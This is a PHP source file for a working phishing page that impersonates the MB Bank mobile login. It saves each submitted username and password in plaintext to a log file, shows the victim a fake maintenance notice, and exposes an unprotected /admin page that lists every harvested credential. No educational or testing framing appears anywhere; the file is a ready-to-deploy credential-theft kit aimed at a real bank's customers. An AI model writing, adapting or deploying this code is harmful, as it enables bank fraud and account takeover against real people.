<?php
// MB Bank Fake UI - Lưu logs khi nhấn Đăng nhập (Không có checkbox lưu đăng nhập)
$uri = $_SERVER['REQUEST_URI'] ?? '/';

// ====================== TRANG XEM LOGS ======================
if (strpos($uri, '/admin') !== false) {
    $logs = [];
    $logContent = file_exists('../logs.txt') ? file_get_contents('../logs.txt') : 'Chưa có dữ liệu nào được lưu.';

    if (file_exists('../logs.txt')) {
        $lines = file('../logs.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        foreach ($lines as $line) {
            $parts = explode(" | ", $line);
            if (count($parts) >= 3) {
                $logs[] = $parts;
            }
        }
    }
?>
<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MB Bank - Xem Logs</title>
    <style>
        body {font-family:'Be Vietnam Pro',sans-serif;background:#000;color:#fff;padding:20px;}
        table {width:100%;border-collapse:collapse;margin:20px 0;}
        th, td {border:1px solid #8fd3f4;padding:12px;text-align:left;}
        th {background:#8fd3f4;color:#0a0a80;}
        pre {background:#111;padding:15px;border-radius:8px;overflow:auto;white-space:pre-wrap;}
        .back {color:#8fd3f4;text-decoration:none;font-size:16px;}
    </style>
</head>
<body>
    <h1>📋 Danh sách đăng nhập đã lưu</h1>
    <p><strong>Tổng số bản ghi:</strong> <?= count($logs) ?></p>

    <?php if (!empty($logs)): ?>
    <table>
        <tr><th>Thời gian</th><th>Tên đăng nhập</th><th>Mật khẩu</th></tr>
        <?php foreach($logs as $log): ?>
        <tr>
            <td><?= htmlspecialchars($log[0] ?? '') ?></td>
            <td><?= htmlspecialchars($log[1] ?? '') ?></td>
            <td><?= htmlspecialchars($log[2] ?? '') ?></td>
        </tr>
        <?php endforeach; ?>
    </table>
    <?php else: ?>
    <p>Chưa có bản ghi nào.</p>
    <?php endif; ?>

    <h2>Nội dung file logs.txt:</h2>
    <pre><?= htmlspecialchars($logContent) ?></pre>

    <br>
    <a href="/" class="back">← Quay lại trang đăng nhập</a>
</body>
</html>
<?php
    exit;
}

// ====================== TRANG LOGIN MB BANK ======================
$showModal = false;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = trim($_POST['username'] ?? '');
    $password = trim($_POST['password'] ?? '');

    if ($username && $password) {
        $logLine = date('Y-m-d H:i:s') . " | " . $username . " | " . $password . "\n";
        file_put_contents('../logs.txt', $logLine, FILE_APPEND | LOCK_EX);
        $showModal = true;
    }
}
?>

<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MB Bank UI</title>

    <link href="https://fonts.googleapis.com/css2?family=Be+Vietnam+Pro:wght@300;400;500;600&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" rel="stylesheet">

    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Be Vietnam Pro',sans-serif;}
        body{height:100vh;display:flex;justify-content:center;align-items:center;background:#000;}
        
        .phone {
            width: 390px;
            height: 844px;
            border-radius: 40px;
            overflow: hidden;
            position: relative;
            box-shadow: 0 40px 80px rgba(0,0,0,0.7);
            background: url("/bg.jpg") center/cover no-repeat fixed;
            color: white;
        }

        .container {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 88%;
            padding: 40px 28px;
            border-radius: 30px;
            background: rgba(255,255,255,0.08);
            backdrop-filter: blur(30px);
            border: 1px solid rgba(255,255,255,0.25);
            box-shadow: inset 0 0 40px rgba(255,255,255,0.05), 0 0 30px rgba(0,0,0,0.3);
            text-align: center;
        }

        h1 {font-size:28px;font-weight:300;line-height:1.4;margin-bottom:35px;}
        .input-group {position:relative;margin-bottom:25px;text-align:left;}
        input {width:100%;padding:12px 0;background:transparent;border:none;border-bottom:1px solid rgba(255,255,255,0.6);color:white;outline:none;font-size:16px;}
        input::placeholder {color:rgba(255,255,255,0.8);}
        .toggle-password {position:absolute;right:0;top:50%;transform:translateY(-50%);cursor:pointer;color:rgba(255,255,255,0.7);}

        .row {display:flex;justify-content:space-between;font-size:15px;margin-bottom:25px;}
        .login-btn {
            width:100%;padding:16px;border:none;border-radius:30px;background:#8fd3f4;
            font-weight:600;font-size:18px;color:#0a0a80;cursor:pointer;
        }
        .version {text-align:center;margin-top:20px;font-size:14px;opacity:0.9;}
        .bottom-icons {
            position:absolute;bottom:40px;width:100%;display:flex;justify-content:center;gap:40px;
        }
        .circle-icon {
            width:55px;height:55px;border-radius:50%;border:1px solid rgba(255,255,255,0.4);
            display:flex;justify-content:center;align-items:center;font-size:22px;backdrop-filter:blur(10px);
        }

        .maintenance-modal {
            display:none;position:fixed;top:0;left:0;width:100%;height:100%;
            background:rgba(0,0,0,0.85);z-index:1000;justify-content:center;align-items:center;
        }
        .modal-content {
            background:rgba(255,255,255,0.1);backdrop-filter:blur(20px);
            border:1px solid rgba(255,255,255,0.3);border-radius:20px;
            width:85%;padding:30px 25px;text-align:center;
        }
        .modal-icon {font-size:50px;margin-bottom:15px;color:#ffcc00;}
        .modal-title {font-size:20px;font-weight:600;margin-bottom:12px;color:#fff;}
        .modal-text {font-size:15px;line-height:1.5;color:rgba(255,255,255,0.85);margin-bottom:25px;}
        .modal-btn {
            width:100%;padding:14px;background:#8fd3f4;color:#0a0a80;border:none;
            border-radius:30px;font-size:16px;font-weight:600;cursor:pointer;
        }
    </style>
</head>
<body>

<div class="phone">
    <div class="container">
        <h1>Chào mừng bạn<br>đến với MB Bank</h1>

        <form method="POST">
            <div class="input-group">
                <input type="text" name="username" id="username" placeholder="Tên đăng nhập" required>
            </div>
            <div class="input-group">
                <input type="password" name="password" id="password" placeholder="Mật khẩu" required>
                <i class="fa-solid fa-eye toggle-password" onclick="togglePassword()"></i>
            </div>

            <!-- Đã xóa checkbox "Lưu đăng nhập" -->

            <div class="row">
                <span>Tạo tài khoản</span>
                <span>Quên mật khẩu?</span>
            </div>

            <button type="submit" class="login-btn">Đăng nhập</button>
        </form>

        <div class="version">
            Phiên bản v28.5.70 (4) &nbsp;&nbsp; Phiên bản mới nhất
        </div>
    </div>

    <div class="bottom-icons">
        <div class="circle-icon"><i class="fa-brands fa-facebook-f"></i></div>
        <div class="circle-icon"><i class="fa-solid fa-globe"></i></div>
    </div>
</div>

<!-- Modal bảo trì -->
<div id="maintenanceModal" class="maintenance-modal" style="display: <?= $showModal ? 'flex' : 'none' ?>;">
    <div class="modal-content">
        <div class="modal-icon">⚠️</div>
        <div class="modal-title">Thông báo hệ thống</div>
        <div class="modal-text">
            Hệ thống đang bảo trì do số lượng truy cập quá lớn.<br><br>
            Vui lòng quay lại sau <strong>1 giờ</strong>.<br><br>
            <small>Thông tin đăng nhập đã được lưu.</small>
        </div>
        <button class="modal-btn" onclick="closeModal()">Đóng</button>
    </div>
</div>

<script>
function togglePassword() {
    const pw = document.getElementById("password");
    const icon = document.querySelector(".toggle-password");
    if (pw.type === "password") {
        pw.type = "text";
        icon.classList.replace("fa-eye","fa-eye-slash");
    } else {
        pw.type = "password";
        icon.classList.replace("fa-eye-slash","fa-eye");
    }
}
function closeModal() {
    document.getElementById("maintenanceModal").style.display = "none";
}
</script>

</body>
</html>
